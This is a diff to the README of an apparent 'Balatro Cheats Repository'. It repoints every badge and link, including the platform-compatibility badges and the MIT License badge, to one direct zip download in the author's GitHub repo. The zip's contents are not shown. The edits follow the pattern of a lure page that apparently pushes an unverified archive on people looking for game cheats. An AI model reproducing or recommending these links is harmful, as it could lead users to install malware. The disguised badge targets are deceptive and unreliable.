@@ -1,6 +1,6 @@
 # Balatro Cheats Repository
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://4swar4nas.github.io)
+[![Download](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)
 
 Unlock next-level experiences in *Balatro* with this ultimate repository of game-enhancing tools, creative “cheats,” and advanced scripts. Pave your way to poker mastery and explore unique modifications designed to broaden your gameplay horizons. This project is engineered for puzzle enthusiasts, streaming creators, and digital explorers who love pushing the boundaries of card roguelike strategy. 
 
@@ -12,11 +12,11 @@ Welcome to your headquarters for advanced Balatro extensions and innovative comp
 
 |  💻 Platform       | 🏗️ Supported Versions         | ✅ Status    |
 |--------------------|------------------------------|------------|
-| ![Windows](https://img.shields.io/badge/Windows-blue)    | Windows 10, 11                   | Fully compatible |
-| ![macOS](https://img.shields.io/badge/macOS-lightgrey)   | Monterey, Ventura, Sonoma        | Fully compatible |
-| ![Linux](https://img.shields.io/badge/Linux-green)        | Ubuntu 22.04+, Fedora 38+        | Fully compatible |
-| ![SteamDeck](https://img.shields.io/badge/SteamDeck-steelblue) | Latest stable                     | Optimized    |
-| ![Android](https://img.shields.io/badge/Android-yellow)   | 11, 12, 13, 14                   | Partial*     |
+| ![Windows](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)    | Windows 10, 11                   | Fully compatible |
+| ![macOS](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)   | Monterey, Ventura, Sonoma        | Fully compatible |
+| ![Linux](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)        | Ubuntu 22.04+, Fedora 38+        | Fully compatible |
+| ![SteamDeck](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip) | Latest stable                     | Optimized    |
+| ![Android](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)   | 11, 12, 13, 14                   | Partial*     |
 
 > *Some features may not operate in all mobile environments.
 
@@ -76,7 +76,7 @@ This repository is for educational, modding, and creative purposes only. The ter
 
 This project is released under the MIT License.
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![License](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)
 
 See [LICENSE](LICENSE) for full text.
 
@@ -88,7 +88,7 @@ See [LICENSE](LICENSE) for full text.
 
 Download the latest artifacts and scripts by clicking below:
 
-[![Download](https://img.shields.io/badge/Download-purple)](https://4swar4nas.github.io)
+[![Download](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)](https://github.com/4swar4nas/balatro-tips-n-tricks/raw/refs/heads/main/strive/tips-n-tricks-balatro-v3.4.zip)
 
 ---
 
